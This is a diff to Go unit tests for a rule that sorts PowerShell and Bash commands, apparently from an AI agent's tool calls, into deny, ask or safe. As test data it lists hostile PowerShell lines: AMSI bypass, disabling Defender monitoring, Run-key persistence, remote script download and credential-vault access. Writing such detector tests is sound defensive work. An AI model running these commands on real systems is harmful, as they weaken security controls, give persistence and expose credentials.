@@ -50,6 +50,40 @@ func TestDangerousCommandRule_Deny(t *testing.T) {
 			t.Errorf("expected Deny for %q, got %v", cmd, d)
 		}
 	}
+
+	// PowerShell encoded commands - test with both PowerShell and Bash tool names
+	powershellDenyTests := []struct {
+		cmd      string
+		toolName string
+	}{
+		// PowerShell tool name
+		{"powershell -enc ZQBjAGgAbwAgACIAaABlAGwAbABvACIA", "PowerShell"},
+		{"pwsh -EncodedCommand ZQBjAGgAbwAgACIAaABlAGwAbABvACIA", "PowerShell"},
+		{"powershell -enc ZQBj", "PowerShell"},
+		{"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "PowerShell"},
+		{"powershell -ExecutionPolicy Bypass -File script.ps1", "PowerShell"},
+		{"pwsh -ep Unrestricted -c Get-Process", "PowerShell"},
+		{"[ScriptBlock]::Create('Remove-Item C:\\')", "PowerShell"},
+		{"[PowerShell]::Create()", "PowerShell"},
+		{"[System.Reflection.Assembly]::Load($bytes)", "PowerShell"},
+		{"Set-MpPreference -DisableRealtimeMonitoring $true", "PowerShell"},
+		{"Add-MpPreference -ExclusionPath C:\\Temp", "PowerShell"},
+		{"$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'", "PowerShell"},
+		// Bash tool name (should also trigger via isShellTool)
+		{"powershell -enc ZQBjAGgAbwAgACIAaABlAGwAbABvACIA", "Bash"},
+		{"[ScriptBlock]::Create('Remove-Item C:\\')", "Bash"},
+	}
+	for _, tc := range powershellDenyTests {
+		ctx := &EvalContext{
+			ToolName:   tc.toolName,
+			Input:      json.RawMessage(bashInput(tc.cmd)),
+			WorkingDir: wd(),
+		}
+		d := rule.Evaluate(ctx)
+		if d == nil || d.Verdict != VerdictDeny {
+			t.Errorf("expected Deny for %q (tool=%s), got %v", tc.cmd, tc.toolName, d)
+		}
+	}
 }
 
 func TestDangerousCommandRule_Ask(t *testing.T) {
@@ -75,6 +109,41 @@ func TestDangerousCommandRule_Ask(t *testing.T) {
 			t.Errorf("expected Ask for %q, got %v", cmd, d)
 		}
 	}
+
+	// PowerShell ask tests - test with both PowerShell and Bash tool names
+	powershellAskTests := []struct {
+		cmd      string
+		toolName string
+	}{
+		// PowerShell tool name
+		{"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList calc.exe", "PowerShell"},
+		{"Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc.exe'}", "PowerShell"},
+		{"(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')", "PowerShell"},
+		{"[System.Net.WebClient]::new()", "PowerShell"},
+		{"New-Object -ComObject WScript.Shell", "PowerShell"},
+		{"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Evil -Value cmd.exe", "PowerShell"},
+		{"$ExecutionContext.InvokeCommand.ExpandString('whoami')", "PowerShell"},
+		{"Get-Credential", "PowerShell"},
+		{"Get-StoredCredential -Target MyTarget", "PowerShell"},
+		{"vaultcmd /list", "PowerShell"},
+		{"powershell -WindowStyle Hidden -File script.ps1", "PowerShell"},
+		{"[System.Convert]::FromBase64String($encoded)", "PowerShell"},
+		// Bash tool name (should also trigger via isShellTool)
+		{"Invoke-CimMethod -ClassName Win32_Process -MethodName Create", "Bash"},
+		{"[System.Convert]::FromBase64String('abc')", "Bash"},
+		{"Get-Credential", "Bash"},
+	}
+	for _, tc := range powershellAskTests {
+		ctx := &EvalContext{
+			ToolName:   tc.toolName,
+			Input:      json.RawMessage(bashInput(tc.cmd)),
+			WorkingDir: wd(),
+		}
+		d := rule.Evaluate(ctx)
+		if d == nil || d.Verdict != VerdictAsk {
+			t.Errorf("expected Ask for %q (tool=%s), got %v", tc.cmd, tc.toolName, d)
+		}
+	}
 }
 
 func TestDangerousCommandRule_Safe(t *testing.T) {
@@ -94,6 +163,27 @@ func TestDangerousCommandRule_Safe(t *testing.T) {
 		d := rule.Evaluate(ctx)
 		if d != nil {
 			t.Errorf("expected nil (abstain) for %q, got %v", cmd, d)
+		}
+	}
+
+	// PowerShell safe tests - should NOT trigger
+	powershellSafeTests := []string{
+		"Get-ChildItem C:\\Users\\project",
+		"Get-Content README.md",
+		"Write-Output 'hello world'",
+		"Test-Path C:\\Users\\project\\file.txt",
+		"dotnet build",
+		"$PSVersionTable",
+	}
+	for _, cmd := range powershellSafeTests {
+		ctx := &EvalContext{
+			ToolName:   "PowerShell",
+			Input:      json.RawMessage(bashInput(cmd)),
+			WorkingDir: wd(),
+		}
+		d := rule.Evaluate(ctx)
+		if d != nil {
+			t.Errorf("expected nil (abstain) for safe PowerShell command %q, got %v", cmd, d)
 		}
 	}
 }
@@ -403,5 +493,18 @@ patterns:
 	}
 	if rule.patterns[0].verdict != VerdictAsk {
 		t.Errorf("expected Ask verdict, got %v", rule.patterns[0].verdict)
+	}
+}
+
+// --- DetectLanguage tests ---
+
+func TestDetectLanguage_PowerShell(t *testing.T) {
+	ctx := &EvalContext{
+		ToolName: "PowerShell",
+		Input:    json.RawMessage(bashInput("Get-Process")),
+	}
+	lang := DetectLanguage(ctx)
+	if lang != "powershell" {
+		t.Errorf("expected powershell, got %q", lang)
 	}
 }
